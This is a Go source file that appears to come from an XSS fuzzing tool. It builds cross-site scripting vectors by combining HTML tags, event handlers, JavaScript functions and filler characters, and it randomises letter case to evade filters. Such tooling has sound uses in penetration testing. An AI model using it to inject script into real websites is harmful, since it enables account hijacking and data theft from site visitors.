package payload

import (
	"math/rand"
	"strings"
)

type GeneratorInput struct {
	Fillings      []string
	EFillings     []string
	LFillings     []string
	EventHandlers map[string][]string
	Tags          []string
	Functions     []string
	Ends          []string
	BadTag        string
	Bait          string
}

func RandomUpper(s string, rng *rand.Rand) string {
	if s == "" {
		return s
	}
	if rng == nil {
		rng = rand.New(rand.NewSource(rand.Int63()))
	}
	builder := strings.Builder{}
	builder.Grow(len(s))
	for _, r := range s {
		upper := strings.ToUpper(string(r))
		lower := strings.ToLower(string(r))
		if rng.Intn(2) == 0 {
			builder.WriteString(upper)
		} else {
			builder.WriteString(lower)
		}
	}
	return builder.String()
}

func GenerateVectors(in GeneratorInput, rng *rand.Rand) []string {
	vectors := []string{}
	endsContainGT := contains(in.Ends, ">")
	for _, tag := range in.Tags {
		bait := ""
		if tag == "d3v" || tag == "a" {
			bait = in.Bait
		}
		for event, compatibleTags := range in.EventHandlers {
			if !contains(compatibleTags, tag) {
				continue
			}
			for _, function := range in.Functions {
				for _, filling := range in.Fillings {
					for _, eFilling := range in.EFillings {
						for _, lFilling := range in.LFillings {
							for _, end := range in.Ends {
								finalEnd := end
								if (tag == "d3v" || tag == "a") && endsContainGT {
									finalEnd = ">"
								}

								breaker := ""
								if in.BadTag != "" {
									breaker = "</" + RandomUpper(in.BadTag, rng) + ">"
								}

								vector := breaker + "<" + RandomUpper(tag, rng) + filling + RandomUpper(event, rng) + eFilling + "=" + eFilling + function + lFilling + finalEnd + bait
								vectors = append(vectors, vector)
							}
						}
					}
				}
			}
		}
	}
	return vectors
}

func contains(list []string, item string) bool {
	for _, current := range list {
		if current == item {
			return true
		}
	}
	return false
}
